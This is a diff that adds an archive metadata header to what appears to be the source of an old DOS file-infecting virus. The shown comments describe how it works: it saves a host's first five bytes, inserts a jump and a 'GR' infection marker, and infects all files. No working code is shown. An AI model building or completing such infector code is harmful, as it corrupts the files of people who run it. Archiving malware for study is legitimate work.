@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      D
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;This program is a virus that infects all files, not just executables. It gets
 ;the first five bytes of its host and stores them elsewhere in the program and
 ;puts a jump to it at the start, along with the letters "GR", which are used to
